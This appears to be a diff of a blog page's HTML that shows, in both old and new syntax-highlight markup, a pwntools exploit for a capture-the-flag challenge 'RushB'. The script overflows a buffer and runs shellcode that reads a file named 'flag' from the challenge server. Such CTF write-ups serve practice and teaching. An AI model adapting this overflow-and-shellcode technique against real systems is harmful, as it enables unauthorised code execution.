+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'pwnto.fun'</span>,<span class="number">12300</span>)</span><br><span class="line"><span class="comment">#p = process('./RushB')</span></span><br><span class="line"></span><br><span class="line">payload  =<span class="string">"\x48\x31\xFF\x48\x31\xF6\x48\xC7\xC0\x02\x00\x00\x00\x68\x66\x6C\x61\x67\x48"</span></span><br><span class="line">payload +=<span class="string">"\x89\xE7\x0F\x05\x48\x31\xFF\x48\x31\xF6\x48\x89\xC7\x48\xC7\xC0\x00\x00\x00"</span></span><br><span class="line">payload +=<span class="string">"\x00\x48\xC7\xC6\x00\x38\x12\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x48\xC7\xC7"</span></span><br><span class="line">payload +=<span class="string">"\x01\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05"</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*(<span class="number">0x38</span>)+p64(<span class="number">0x123000</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwnto.fun'</span><span class="token punctuation">,</span><span class="token number">12300</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#p = process('./RushB')</span>
-
-payload  <span class="token operator">=</span><span class="token string">"\x48\x31\xFF\x48\x31\xF6\x48\xC7\xC0\x02\x00\x00\x00\x68\x66\x6C\x61\x67\x48"</span>
-payload <span class="token operator">+=</span><span class="token string">"\x89\xE7\x0F\x05\x48\x31\xFF\x48\x31\xF6\x48\x89\xC7\x48\xC7\xC0\x00\x00\x00"</span>
-payload <span class="token operator">+=</span><span class="token string">"\x00\x48\xC7\xC6\x00\x38\x12\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x48\xC7\xC7"</span>
-payload <span class="token operator">+=</span><span class="token string">"\x01\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05"</span>
-
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x123000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 
   </div>
 </article>
